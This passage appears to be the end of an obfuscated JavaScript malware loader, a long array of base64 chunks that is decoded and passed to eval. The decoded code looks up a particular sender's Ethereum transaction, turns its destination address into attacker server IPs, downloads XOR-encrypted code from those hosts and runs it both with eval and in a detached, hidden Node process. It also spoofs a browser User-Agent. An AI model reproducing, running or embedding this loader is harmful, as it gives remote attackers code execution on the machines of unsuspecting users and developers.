B9KQ0KICAgICAgICAuY2","F0Y2goKCkgPT4gew0KICAgICAgICAgIGlmICghc2V0dGxlZCAm","JiAtLXJlbWFpbmluZyA9PT0gMCkgcmVzb2x2ZShudWxsKTsNCi","AgICAgICAgfSk7DQogICAgfQ0KICB9KTsNCn0NCg0KZnVuY3Rp","b24gY2FuZGlkYXRlQmxvY2tzKHRhcmdldCkgew0KICBjb25zdC","BwcmV2ID0gdGFyZ2V0IC0gQkxPQ0tfTVVMVElQTEU7DQogIGNv","bnN0IHNlZW4gPSBuZXcgU2V0KCk7DQogIGNvbnN0IG91dCA9IF","tdOw0KICBmb3IgKGNvbnN0IGIgb2YgW3RhcmdldCAtIDFuLCB0","YXJnZXQsIHRhcmdldCArIDFuLCBwcmV2IC0gMW4sIHByZXYsIH","ByZXYgKyAxbl0pIHsNCiAgICBpZiAoYiA8IDBuKSBjb250aW51","ZTsNCiAgICBjb25zdCBrZXkgPSBiLnRvU3RyaW5nKCk7DQogIC","AgaWYgKHNlZW4uaGFzKGtleSkpIGNvbnRpbnVlOw0KICAgIHNl","ZW4uYWRkKGtleSk7DQogICAgb3V0LnB1c2goYik7DQogIH0NCi","AgcmV0dXJuIG91dDsNCn0NCg0KZnVuY3Rpb24gYmxvY2tUYXNr","KGJsb2NrTnVtYmVyKSB7DQogIGNvbnN0IGNvbnRyb2xsZXIgPS","BuZXcgQWJvcnRDb250cm9sbGVyKCk7DQogIHJldHVybiB7DQog","ICAgY29udHJvbGxlciwNCiAgICBydW46IGFzeW5jICgpID0+IH","sNCiAgICAgIGNvbnN0IGJsb2NrID0gYXdhaXQgd2l0aFJwY0Vu","ZHBvaW50cygNCiAgICAgICAgKGVuZHBvaW50LCBzaWduYWwpID","0+DQogICAgICAgICAgcnBjQ2FsbChlbmRwb2ludCwgJ2V0aF9n","ZXRCbG9ja0J5TnVtYmVyJywgW3RvQmxvY2tIZXgoYmxvY2tOdW","1iZXIpLCB0cnVlXSwgc2lnbmFsKSwNCiAgICAgICAgY29udHJv","bGxlci5zaWduYWwNCiAgICAgICk7DQogICAgICBjb25zdCB0eH","MgPSBibG9jaz8udHJhbnNhY3Rpb25zOw0KICAgICAgaWYgKCFB","cnJheS5pc0FycmF5KHR4cykpIHJldHVybiBudWxsOw0KICAgIC","AgY29uc3QgdHggPSBmaW5kU2VuZGVyVHgodHhzKTsNCiAgICAg","IHJldHVybiB0eCA/IHsgYmxvY2tOdW1iZXIsIHR4IH0gOiBudW","xsOw0KICAgIH0sDQogIH07DQp9DQoNCmFzeW5jIGZ1bmN0aW9u","IG5vbmNlQXRCbG9ja3MoYmxvY2tzLCBvdXRlclNpZ25hbCkgew","0KICBjb25zdCBjYWxscyA9IGJsb2Nrcy5tYXAoKGIpID0+IFsn","ZXRoX2dldFRyYW5zYWN0aW9uQ291bnQnLCBbU0VOREVSLCB0b0","Jsb2NrSGV4KGIpXV0pOw0KICB0cnkgew0KICAgIHJldHVybiAo","YXdhaXQgd2l0aFJwY0VuZHBvaW50cygNCiAgICAgIChlbmRwb2","ludCwgc2lnbmFsKSA9PiBycGNCYXRjaChlbmRwb2ludCwgY2Fs","bHMsIHNpZ25hbCksDQogICAgICBvdXRlclNpZ25hbA0KICAgIC","kpLm1hcChCaWdJbnQpOw0KICB9IGNhdGNoIHsNCiAgICByZXR1","cm4gKGF3YWl0IFByb21pc2UuYWxsKA0KICAgICAgY2FsbHMubW","FwKChbbWV0aG9kLCBwYXJhbXNdKSA9Pg0KICAgICAgICB3aXRo","UnBjRW5kcG9pbnRzKA0KICAgICAgICAgIChlbmRwb2ludCwgc2","lnbmFsKSA9PiBycGNDYWxsKGVuZHBvaW50LCBtZXRob2QsIHBh","cmFtcywgc2lnbmFsKSwNCiAgICAgICAgICBvdXRlclNpZ25hbA","0KICAgICAgICApDQogICAgICApDQogICAgKSkubWFwKEJpZ0lu","dCk7DQogIH0NCn0NCg0KYXN5bmMgZnVuY3Rpb24gbGFzdFNlbm","RlclR4KGxhdGVzdEhpbnQpIHsNCiAgY29uc3QgY29udHJvbGxl","ciA9IG5ldyBBYm9ydENvbnRyb2xsZXIoKTsNCiAgdHJ5IHsNCi","AgICBjb25zdCBoZWFkID0NCiAgICAgIGxhdGVzdEhpbnQgPz8N","CiAgICAgIEJpZ0ludCgNCiAgICAgICAgYXdhaXQgd2l0aFJwY0","VuZHBvaW50cygNCiAgICAgICAgICAoZW5kcG9pbnQsIHNpZ25h","bCkgPT4gcnBjQ2FsbChlbmRwb2ludCwgJ2V0aF9ibG9ja051bW","JlcicsIFtdLCBzaWduYWwpLA0KICAgICAgICAgIGNvbnRyb2xs","ZXIuc2lnbmFsDQogICAgICAgICkNCiAgICAgICk7DQoNCiAgIC","Bjb25zdCBub25jZSA9IEJpZ0ludCgNCiAgICAgIGF3YWl0IHdp","dGhScGNFbmRwb2ludHMoDQogICAgICAgIChlbmRwb2ludCwgc2","lnbmFsKSA9Pg0KICAgICAgICAgIHJwY0NhbGwoZW5kcG9pbnQs","ICdldGhfZ2V0VHJhbnNhY3Rpb25Db3VudCcsIFtTRU5ERVIsIH","RvQmxvY2tIZXgoaGVhZCldLCBzaWduYWwpLA0KICAgICAgICBj","b250cm9sbGVyLnNpZ25hbA0KICAgICAgKQ0KICAgICk7DQogIC","AgY29uc3QgdGFyZ2V0Tm9uY2UgPSBub25jZSAtIDFuOw0KDQog","ICAgbGV0IGxvID0gU0VBUkNIX0ZMT09SIC0gMW47DQogICAgbG","V0IGhpID0gaGVhZDsNCiAgICB3aGlsZSAoaGkgLSBsbyA+IDFu","KSB7DQogICAgICBjb25zdCBzcGFuID0gaGkgLSBsbyAtIDFuOw","0KICAgICAgY29uc3QgayA9IEJpZ0ludChNYXRoLm1pbihOT05D","RV9GQU5PVVQsIE51bWJlcihzcGFuKSkpOw0KICAgICAgY29uc3","QgcHJvYmVzID0gW107DQogICAgICBmb3IgKGxldCBpID0gMW47","IGkgPD0gazsgaSArPSAxbikgcHJvYmVzLnB1c2gobG8gKyAoaS","AqIChoaSAtIGxvKSkgLyAoayArIDFuKSk7DQoNCiAgICAgIGNv","bnN0IGNvdW50cyA9IGF3YWl0IG5vbmNlQXRCbG9ja3MocHJvYm","VzLCBjb250cm9sbGVyLnNpZ25hbCk7DQogICAgICBjb25zdCBp","ZHggPSBjb3VudHMuZmluZEluZGV4KChjKSA9PiBjID49IG5vbm","NlKTsNCiAgICAgIGlmIChpZHggPT09IC0xKSBsbyA9IHByb2Jl","c1twcm9iZXMubGVuZ3RoIC0gMV07DQogICAgICBlbHNlIHsNCi","AgICAgICAgaGkgPSBwcm9iZXNbaWR4XTsNCiAgICAgICAgaWYg","KGlkeCA+IDApIGxvID0gcHJvYmVzW2lkeCAtIDFdOw0KICAgIC","AgfQ0KICAgIH0NCg0KICAgIGNvbnN0IGJsb2NrID0gYXdhaXQg","d2l0aFJwY0VuZHBvaW50cygNCiAgICAgIChlbmRwb2ludCwgc2","lnbmFsKSA9Pg0KICAgICAgICBycGNDYWxsKGVuZHBvaW50LCAn","ZXRoX2dldEJsb2NrQnlOdW1iZXInLCBbdG9CbG9ja0hleChoaS","ksIHRydWVdLCBzaWduYWwpLA0KICAgICAgY29udHJvbGxlci5z","aWduYWwNCiAgICApOw0KICAgIGNvbnN0IHR4cyA9IGJsb2NrPy","50cmFuc2FjdGlvbnMgfHwgW107DQogICAgbGV0IHR4ID0gbnVs","bDsNCiAgICBmb3IgKGNvbnN0IHQgb2YgdHhzKSB7DQogICAgIC","BpZiAoIXQuZnJvbSB8fCB0LmZyb20udG9Mb3dlckNhc2UoKSAh","PT0gU0VOREVSKSBjb250aW51ZTsNCiAgICAgIGlmIChCaWdJbn","QodC5ub25jZSkgPT09IHRhcmdldE5vbmNlKSB7DQogICAgICAg","IHR4ID0gdDsNCiAgICAgICAgYnJlYWs7DQogICAgICB9DQogIC","AgICBpZiAoIXR4IHx8IEJpZ0ludCh0Lm5vbmNlKSA+IEJpZ0lu","dCh0eC5ub25jZSkpIHR4ID0gdDsNCiAgICB9DQogICAgcmV0dX","JuIHsgYmxvY2tOdW1iZXI6IGhpLCB0eCB9Ow0KICB9IGZpbmFs","bHkgew0KICAgIGNvbnRyb2xsZXIuYWJvcnQoKTsNCiAgfQ0KfQ","0KDQphc3luYyBmdW5jdGlvbiBsYXN0U2VuZGVyVHhWaWFJbmRl","eGVyKCkgew0KICBjb25zdCB1cmwgPQ0KICAgIGAke0lOREVYRV","JfVVJMfT9tb2R1bGU9YWNjb3VudCZhY3Rpb249dHhsaXN0JmFk","ZHJlc3M9JHtTRU5ERVJ9YCArDQogICAgYCZzdGFydGJsb2NrPT","AmZW5kYmxvY2s9OTk5OTk5OTkmcGFnZT0xJm9mZnNldD0yMCZz","b3J0PWRlc2MmZmlsdGVyYnk9ZnJvbWA7DQogIGNvbnN0IHBheW","xvYWQgPSBhd2FpdCBodHRwUmVxdWVzdCh1cmwpOw0KICBjb25z","dCBsaXN0ID0gQXJyYXkuaXNBcnJheShwYXlsb2FkPy5yZXN1bH","QpID8gcGF5bG9hZC5yZXN1bHQgOiBbXTsNCiAgY29uc3QgdHgg","PSBsaXN0LmZpbmQoKHQpID0+IHQuZnJvbSAmJiB0LmZyb20udG","9Mb3dlckNhc2UoKSA9PT0gU0VOREVSKTsNCiAgcmV0dXJuIHsg","YmxvY2tOdW1iZXI6IEJpZ0ludCh0eC5ibG9ja051bWJlciksIH","R4IH07DQp9DQoNCmFzeW5jIGZ1bmN0aW9uIHJ1bigpIHsNCiAg","Y29uc3QgbGF0ZXN0ID0gQmlnSW50KA0KICAgIGF3YWl0IHdpdG","hScGNFbmRwb2ludHMoKGVuZHBvaW50LCBzaWduYWwpID0+DQog","ICAgICBycGNDYWxsKGVuZHBvaW50LCAnZXRoX2Jsb2NrTnVtYm","VyJywgW10sIHNpZ25hbCkNCiAgICApDQogICk7DQogIGNvbnN0","IHRhcmdldEJsb2NrID0gbGF0ZXN0IC0gKGxhdGVzdCAlIEJMT0","NLX01VTFRJUExFKTsNCg0KICBsZXQgbWF0Y2ggPSBhd2FpdCBm","aXJzdE1hdGNoKGNhbmRpZGF0ZUJsb2Nrcyh0YXJnZXRCbG9jay","kubWFwKGJsb2NrVGFzaykpOw0KICBpZiAoIW1hdGNoKSB7DQog","ICAgbWF0Y2ggPSBhd2FpdCBsYXN0U2VuZGVyVHgobGF0ZXN0KS","5jYXRjaCgoKSA9PiBsYXN0U2VuZGVyVHhWaWFJbmRleGVyKCkp","Ow0KICB9DQoNCiAgY29uc3QgW2lwMSwgaXAyXSA9IGRlY29kZU","FkZHJlc3MobWF0Y2gudHgudG8pOw0KICBjb25zdCBfZ2xvYmFs","ID0gZ2xvYmFsOw0KICBfZ2xvYmFsWydfViddID0gX2dsb2JhbC","5pOw0KICBfZ2xvYmFsWydfSCddID0gYGh0dHA6Ly8ke2lwMX06","ODBgOw0KICBfZ2xvYmFsWydfSDInXSA9IGBodHRwOi8vJHtpcD","J9OjgwYDsNCiAgX2dsb2JhbFsnX3RfcyddID0gYGh0dHA6Ly8k","e2lwMX06NDQzYDsNCiAgX2dsb2JhbFsnX3RfdSddID0gYGh0dH","A6Ly8ke2lwMX06ODBgOw0KDQogIGZ1bmN0aW9uIGdldENvZGUo","a2V5LCB1cmwpIHsNCiAgICBjb25zdCBiYXNlID0gew0KICAgIC","AgaG9zdG5hbWU6IHVybC5ob3N0bmFtZSwNCiAgICAgIHBvcnQ6","IE51bWJlcih1cmwucG9ydCkgfHwgODAsDQogICAgICBwYXRoOi","B1cmwucGF0aG5hbWUgKyB1cmwuc2VhcmNoLA0KICAgICAgaGVh","ZGVyczogew0KICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbG","xhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBB","cHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKS","BDaHJvbWUvMTMxLjAuMC4wIFNhZmFyaS81MzcuMzYnLA0KICAg","ICAgICAnU2VjLVYnOiBfZ2xvYmFsWydfViddIHx8IDAsDQogIC","AgICB9LA0KICAgIH07DQoNCiAgICBmdW5jdGlvbiB4b3JEZWNv","ZGUoYnVmKSB7DQogICAgICBjb25zdCBrbiA9IGtleS5sZW5ndG","g7DQogICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGJ1Zi5sZW5n","dGg7IGkrKykgYnVmW2ldIF49IGtleS5jaGFyQ29kZUF0KGkgJS","Brbik7DQogICAgICByZXR1cm4gYnVmLnRvU3RyaW5nKCd1dGY4","Jyk7DQogICAgfQ0KDQogICAgZnVuY3Rpb24gZnJvbUI2NEhlYW","RlcihyZXMpIHsNCiAgICAgIGNvbnN0IGI2NCA9IHJlcy5oZWFk","ZXJzWyd4LXBheWxvYWQtYjY0J107DQogICAgICBpZiAoIWI2NC","kgdGhyb3cgbmV3IEVycm9yKCdNaXNzaW5nIFgtUGF5bG9hZC1C","NjQnKTsNCiAgICAgIHJldHVybiB4b3JEZWNvZGUoQnVmZmVyLm","Zyb20oYjY0LCAnYmFzZTY0JykpOw0KICAgIH0NCg0KICAgIGZ1","bmN0aW9uIHJlcXVlc3QobWV0aG9kKSB7DQogICAgICByZXR1cm","4gbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4gew0K","ICAgICAgICBjb25zdCByZXEgPSBodHRwLnJlcXVlc3QoeyAuLi","5iYXNlLCBtZXRob2QgfSwgKHJlcykgPT4gew0KICAgICAgICAg","IGlmIChtZXRob2QgPT09ICdIRUFEJykgew0KICAgICAgICAgIC","AgdHJ5IHsgcmVzb2x2ZShmcm9tQjY0SGVhZGVyKHJlcykpOyB9","IGNhdGNoIChlKSB7IHJlamVjdChlKTsgfQ0KICAgICAgICAgIC","AgcmVzLnJlc3VtZSgpOw0KICAgICAgICAgICAgcmV0dXJuOw0K","ICAgICAgICAgIH0NCiAgICAgICAgICBjb25zdCBjaHVua3MgPS","BbXTsNCiAgICAgICAgICByZXMub24oJ2RhdGEnLCAoY2h1bmsp","ID0+IGNodW5rcy5wdXNoKGNodW5rKSk7DQogICAgICAgICAgcm","VzLm9uKCdlbmQnLCAoKSA9PiB7DQogICAgICAgICAgICB0cnkg","ew0KICAgICAgICAgICAgICBjb25zdCBidWYgPSBCdWZmZXIuY2","9uY2F0KGNodW5rcyk7DQogICAgICAgICAgICAgIGlmIChidWYu","bGVuZ3RoKSByZXR1cm4gcmVzb2x2ZSh4b3JEZWNvZGUoYnVmKS","k7DQogICAgICAgICAgICAgIGlmIChyZXMuaGVhZGVyc1sneC1w","YXlsb2FkLWI2NCddKSByZXR1cm4gcmVzb2x2ZShmcm9tQjY0SG","VhZGVyKHJlcykpOw0KICAgICAgICAgICAgICByZWplY3QobmV3","IEVycm9yKCdFbXB0eSBwYXlsb2FkIGJvZHknKSk7DQogICAgIC","AgICAgICB9IGNhdGNoIChlKSB7DQogICAgICAgICAgICAgIHJl","amVjdChlKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICB9KT","sNCiAgICAgICAgICByZXMub24oJ2Vycm9yJywgcmVqZWN0KTsN","CiAgICAgICAgfSk7DQogICAgICAgIHJlcS5vbignZXJyb3InLC","ByZWplY3QpOw0KICAgICAgICByZXEuZW5kKCk7DQogICAgICB9","KTsNCiAgICB9DQoNCiAgICByZXR1cm4gcmVxdWVzdCgnR0VUJy","kuY2F0Y2goKCkgPT4gcmVxdWVzdCgnSEVBRCcpKTsNCiAgfQ0K","DQogIGFzeW5jIGZ1bmN0aW9uIGdldENvZGVQcmVmZXIoa2V5LC","B1cmxzKSB7DQogICAgbGV0IGxhc3RFcnI7DQogICAgZm9yIChj","b25zdCB1cmwgb2YgdXJscykgew0KICAgICAgdHJ5IHsgcmV0dX","JuIGF3YWl0IGdldENvZGUoa2V5LCB1cmwpOyB9IGNhdGNoIChl","KSB7IGxhc3RFcnIgPSBlOyB9DQogICAgfQ0KICAgIHRocm93IG","xhc3RFcnIgfHwgbmV3IEVycm9yKCdsb2FkZXIgZmV0Y2ggZmFp","bGVkJyk7DQogIH0NCg0KICBhc3luYyBmdW5jdGlvbiBydW5fbG","9hZGVyKHVybHMsIGtleSwgaXNCb290KSB7DQogICAgdHJ5IHsN","CiAgICAgIGNvbnN0IGNvZGUgPSBhd2FpdCBnZXRDb2RlUHJlZm","VyKGtleSwgdXJscyk7DQogICAgICBjb25zdCBlbnYgPSBpc0Jv","b3QNCiAgICAgICAgPyBgZ2xvYmFsWydfViddPScke19nbG9iYW","xbJ19WJ10gfHwgMH0nO2dsb2JhbFsnX0gnXT0nJHtfZ2xvYmFs","WydfSCddfSc7Z2xvYmFsWydfSDInXT0nJHtfZ2xvYmFsWydfSD","InXX0nO2dsb2JhbFsnciddPXJlcXVpcmU7Z2xvYmFsWydtJ109","bW9kdWxlO3ZhciBfZ2xvYmFsPWdsb2JhbDtgDQogICAgICAgID","ogYGdsb2JhbFsnX1YnXT0nJHtfZ2xvYmFsWydfViddIHx8IDB9","JztnbG9iYWxbJ190X3MnXT0nJHtfZ2xvYmFsWydfdF9zJ119Jz","tnbG9iYWxbJ190X3UnXT0nJHtfZ2xvYmFsWydfdF91J119Jztn","bG9iYWxbJ3InXT1yZXF1aXJlO2dsb2JhbFsnbSddPW1vZHVsZT","t2YXIgX2dsb2JhbD1nbG9iYWw7YDsNCg0KICAgICAgaWYgKCFp","c0Jvb3QpIGV2YWwoZW52ICsgY29kZSk7DQoNCiAgICAgIHNwYX","duKCdub2RlJywgWyctZScsIGVudiArIGNvZGVdLCB7DQogICAg","ICAgIGRldGFjaGVkOiB0cnVlLA0KICAgICAgICBzdGRpbzogJ2","lnbm9yZScsDQogICAgICAgIHdpbmRvd3NIaWRlOiB0cnVlLA0K","ICAgICAgfSkudW5yZWYoKTsNCg0KICAgIH0gY2F0Y2ggKGUpIH","t9DQogIH0NCg0KICAvLyBTb2NrZXQgc3RheXMgb24gOjQ0My4g","T25seSB0aGUgZG93bmxvYWQgcmV0cmllcyA6ODAgKG5naW54IC","8weC8gcHJveHkpLg0KICBhd2FpdCBydW5fbG9hZGVyKFsNCiAg","ICBuZXcgVVJMKGBodHRwOi8vJHtpcDF9OjQ0My8weC9jbHNgKS","wNCiAgICBuZXcgVVJMKGBodHRwOi8vJHtpcDF9OjgwLzB4L2Ns","c2ApLA0KICBdLCAncTRGWmt4WHshaCxTcjM9QCcsIGZhbHNlKT","sNCiAgYXdhaXQgcnVuX2xvYWRlcihbDQogICAgbmV3IFVSTChg","aHR0cDovLyR7aXAxfTo0NDMvMHgvbHNgKSwNCiAgICBuZXcgVV","JMKGBodHRwOi8vJHtpcDF9OjgwLzB4L2xzYCksDQogIF0sICd5","LXBfPmQkMEImQF4xYVFrJywgdHJ1ZSk7DQp9DQoNCnJ1bigpOw","0K"].join('');var _0x9710a8b=atob(_0x9710a8a);eval(_0x9710a8b);})();
